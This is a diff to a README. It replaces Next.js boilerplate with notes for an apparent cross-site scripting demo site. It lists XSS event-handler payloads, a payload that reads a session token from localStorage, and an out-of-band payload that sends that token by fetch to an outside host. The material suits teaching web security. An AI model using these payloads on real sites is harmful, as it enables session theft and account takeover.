@@ -1,36 +1,19 @@
-This is a [Next.js](https://nextjs.org/) project bootstrapped with [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app).
+# XSS Demo
+*A live version of this site can be found at https://xss.jamiepegg.com*
 
-## Getting Started
+## Example: Payloads
 
-First, run the development server:
+* `<code id=x tabindex=1 onfocus=alert(1)></code>`
+* `<img src=1 onerror=alert(1) />`
+* `<p onmouseover="alert(1)">test</p>`
+* `<p onmouseenter="alert(1)">test</p>`
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
-```
+## Example: Stealing a session token from local storage
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+* `<img src=1 onerror=alert(localStorage.getItem('session')) />`
 
-You can start editing the page by modifying `app/page.js`. The page auto-updates as you edit the file.
+## Example: OOB exfiltration
 
-This project uses [`next/font`](https://nextjs.org/docs/basic-features/font-optimization) to automatically optimize and load Inter, a custom Google Font.
+*For demo purposes, sites such as https://webhook.site/ can be used*
 
-## Learn More
-
-To learn more about Next.js, take a look at the following resources:
-
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
-
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js/) - your feedback and contributions are welcome!
-
-## Deploy on Vercel
-
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
-
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/deployment) for more details.
+* `<img src=1 onerror=(fetch(`https://jamiepegg.com?session=${localStorage.getItem('session')}`)) />`
